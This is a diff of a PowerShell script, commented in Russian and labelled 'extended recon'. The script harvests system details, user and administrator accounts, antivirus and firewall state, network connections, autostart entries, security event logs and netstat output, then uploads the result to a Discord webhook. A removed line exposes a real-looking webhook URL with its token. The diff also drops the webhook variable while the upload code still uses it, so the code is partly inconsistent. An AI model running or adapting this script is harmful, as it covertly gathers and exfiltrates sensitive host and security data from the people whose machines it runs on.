@@ -1,98 +1,88 @@
-# ========== НАСТРОЙКИ ==========
-$webhookUrl = "https://discord.com/api/v10/webhooks/1380240005724770304/ZXWZ-qvvwloOPEwnZqw9wHNi1uuDVK_kmdNGzokReEyjqsHo8m6oDbbjrO2-XBlEctYP"  # 🔴 ОБЯЗАТЕЛЬНО ЗАМЕНИ НА СВОЙ!
-$reportPath = "$env:USERPROFILE\Desktop\System_Report.json"
-$deleteDelaySeconds = 20
-
-# ========== СБОР ДАННЫХ ==========
+# ========== Расширенный рекогнайз ==========
 $report = @{}
 
-$os = Get-CimInstance Win32_OperatingSystem
-$cs = Get-CimInstance Win32_ComputerSystem
-$bios = Get-CimInstance Win32_BIOS
-$cpu = Get-CimInstance Win32_Processor
-$gpu = Get-CimInstance Win32_VideoController
-
-$report['SystemInfo'] = @{
-    'OS' = "$($os.Caption) $($os.Version)"
-    'ComputerName' = $cs.Name
-    'Manufacturer' = $cs.Manufacturer
-    'Model' = $cs.Model
-    'BIOS Version' = ($bios.SMBIOSBIOSVersion -join ', ')
-    'Processor' = $cpu.Name
-    'Cores' = $cpu.NumberOfCores
-    'LogicalProcessors' = $cpu.NumberOfLogicalProcessors
-    'RAM (GB)' = [math]::Round($cs.TotalPhysicalMemory / 1GB, 2)
-    'GPU' = ($gpu | Select-Object -ExpandProperty Name) -join ', '
-    'SystemType' = $cs.SystemType
-    'LastBootUpTime' = $os.LastBootUpTime
+# 1. Hardware
+$report['Hardware'] = @{
+    OS = (Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber)
+    ComputerSystem = Get-CimInstance Win32_ComputerSystem | Select-Object Name, Manufacturer, Model, SystemType, TotalPhysicalMemory
+    BIOS = Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SMBIOSBIOSVersion, ReleaseDate
+    CPU = Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed
+    GPU = Get-CimInstance Win32_VideoController | Select-Object Name, DriverVersion
+    Disks = Get-PhysicalDisk | Select-Object FriendlyName, SerialNumber, HealthStatus, OperationalStatus, Size
+    USBDevices = Get-PnpDevice -Class USB | Select-Object FriendlyName, InstanceId, Status
+    Battery = Get-CimInstance Win32_Battery | Select-Object BatteryStatus, EstimatedChargeRemaining
 }
 
-$ipconfig = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" }
+# 2. Сеть
+$ipConfigs = Get-NetIPAddress -AddressFamily IPv4, IPv6 | Where-Object { $_.IPAddress -notlike '127.*' }
 $adapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }
+$gateways = Get-NetRoute -DestinationPrefix "0.0.0.0/0"
+$dnsServers = Get-DnsClientServerAddress | Select-Object InterfaceAlias, ServerAddresses
 
-$report['NetworkInfo'] = foreach ($adapter in $adapters) {
-    $ip = $ipconfig | Where-Object { $_.InterfaceIndex -eq $adapter.ifIndex }
-    @{
-        'Name' = $adapter.Name
-        'MACAddress' = $adapter.MacAddress
-        'IPAddress' = $ip.IPAddress
-    }
+$report['Network'] = @{
+    IPs = $ipConfigs | Select-Object InterfaceAlias,IPAddress,AddressState
+    Adapters = $adapters | Select-Object Name, MacAddress, LinkSpeed
+    Gateways = $gateways | Select-Object InterfaceAlias, NextHop
+    DNS = $dnsServers
+    ActiveTCPConnections = Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess
+    ActiveUDPConnections = Get-NetUDPEndpoint | Select-Object LocalAddress,LocalPort,OwningProcess
 }
 
-$report['LocalUsers'] = Get-LocalUser | Select-Object Name, Enabled, LastLogon | Sort-Object Name
-$report['LocalGroups'] = Get-LocalGroup | Select-Object Name
-$report['Administrators'] = Get-LocalGroupMember -Group 'Administrators' | Select-Object Name, ObjectClass
-$report['NetworkConnections'] = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
+# 3. Пользователи и безопасность
+$report['Users'] = @{
+    LocalUsers = Get-LocalUser | Select-Object Name, Enabled, LastLogon
+    LocalGroups = Get-LocalGroup | Select-Object Name
+    Admins = Get-LocalGroupMember -Group 'Administrators' | Select-Object Name, ObjectClass
+    FirewallProfiles = Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction
+    AntivirusProduct = Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName, productState
+}
 
-$report['InstalledPrograms'] = @(
-    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*,
-                      HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
-    Where-Object { $_.DisplayName } |
-    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
-)
-
-$report['Updates'] = Get-HotFix | Select-Object HotFixID, Description, InstalledOn
+# 4. Процессы и автозагрузка
 $report['Processes'] = Get-Process | Select-Object Name, Id, CPU, StartTime -ErrorAction SilentlyContinue
-$report['Services'] = Get-Service | Select-Object Name, Status, StartType
 $report['ScheduledTasks'] = Get-ScheduledTask | Select-Object TaskName, TaskPath, State
-
-$startupPaths = @(
-    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\",
-    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
+$startupFolders = @(
+    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
+    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 )
-
-$startupItems = foreach ($path in $startupPaths) {
+$startupItems = foreach ($path in $startupFolders) {
     if (Test-Path $path) {
-        Get-ChildItem -Path $path -Filter *.lnk | Select-Object Name, FullName
+        Get-ChildItem $path -Filter *.lnk | Select-Object Name, FullName
     }
 }
-
 $registryRunKeys = @(
     'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
     'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
 )
-
 $registryStartup = foreach ($key in $registryRunKeys) {
     if (Test-Path $key) {
-        Get-ItemProperty -Path $key | ForEach-Object {
-            $_.PSObject.Properties | Where-Object { $_.Name -ne 'PSPath' } |
-            Select-Object Name, Value
+        Get-ItemProperty $key | ForEach-Object {
+            $_.PSObject.Properties | Where-Object { $_.Name -ne 'PSPath' } | Select-Object Name, Value
         }
     }
 }
-
 $report['StartupItems'] = @{
-    'StartupFolders' = $startupItems
-    'RegistryRun' = $registryStartup
+    StartupFolders = $startupItems
+    RegistryRun = $registryStartup
 }
 
-$report['SharedFolders'] = Get-SmbShare | Select-Object Name, Path, Description
-$report['Drives'] = Get-PSDrive -PSProvider FileSystem | Select-Object Name, Root, Used, Free
-$report['SecurityLogs'] = Get-WinEvent -LogName Security -MaxEvents 50 | Select-Object TimeCreated, Id, Message
+# 5. Логи и события
+$report['EventLogs'] = @{
+    Security = Get-WinEvent -LogName Security -MaxEvents 100 | Select-Object TimeCreated, Id, LevelDisplayName, Message
+    System = Get-WinEvent -LogName System -MaxEvents 100 | Select-Object TimeCreated, Id, LevelDisplayName, Message
+    Application = Get-WinEvent -LogName Application -MaxEvents 100 | Select-Object TimeCreated, Id, LevelDisplayName, Message
+}
 
-# ========== СОХРАНЕНИЕ ==========
-$report | ConvertTo-Json -Depth 5 | Out-File -FilePath $reportPath -Encoding utf8
-Write-Output "✅ Отчет сохранен: $reportPath"
+# 6. Дополнительно - проверка открытых портов на localhost
+# Используем netstat через cmd для совместимости
+$netstat = netstat -anob | Out-String
+$report['OpenPorts'] = $netstat
+
+# ========== Конвертируем и сохраняем ==========
+$reportPath = "$env:USERPROFILE\Desktop\System_Universal_Report.json"
+$report | ConvertTo-Json -Depth 7 | Out-File -FilePath $reportPath -Encoding utf8
+
+Write-Output "✅ Расширенный отчет сохранён: $reportPath"
+
 
 # ========== ОТПРАВКА В DISCORD ==========
 try {
@@ -102,7 +92,7 @@ try {
     $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
 
     $multiPartContent = New-Object System.Net.Http.MultipartFormDataContent
-    $multiPartContent.Add($fileContent, "file", "System_Report.json")
+    $multiPartContent.Add($fileContent, "file", "System_Universal_Report.json")
 
     $httpClient = New-Object System.Net.Http.HttpClient
     $response = $httpClient.PostAsync($webhookUrl, $multiPartContent).Result
